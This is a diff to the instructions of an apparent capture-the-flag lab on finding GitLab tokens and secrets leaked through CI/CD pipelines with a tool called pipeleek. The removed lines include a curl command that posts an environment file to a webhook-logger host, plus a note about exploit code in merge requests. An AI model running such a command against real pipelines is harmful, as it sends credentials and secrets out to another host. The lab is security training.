@@ -35,15 +35,9 @@ Sensitive values cannot only be found in pipeline logs, but also in generated Ar
 
 ## Scenario Description
 
-**Helper Service:** To extract information from CI/CD pipelines, you can use the webhook logger service at `http://localhost:7705`. Any request to it will be logged and you can view the request logs at `http://localhost:7705/logs`. 
-
-Example curl command: `curl -k -sSf -X POST -F "files=@$ENV_FILE" http://webhook-logger:8084`
-
-⚠️ **Note:** Be careful about directly invoking the bot to create MRs - it could create the MR before you've updated your exploit code!
-
 ### Phase 1: GitLab Access Token Discovery 
 
-Using `Pipeleek scan` try to find a personal access token that is being leaked on the GitLab instance.
+Using `pipeleek scan` try to find a personal access token that is being leaked on the GitLab instance.
 
 > Tip: review the options of the scan command to increase your scan coverage.
 
@@ -57,4 +51,4 @@ In possession of a new PAT you can again enumerate your newly discovered access 
 
 Find all the flags
 
-**Hint:** Sometimes not all configured variables are actually used - focus on those that appear in the artifacts or logs.
+**Hint:** Sometimes not all configured variables are actually used.
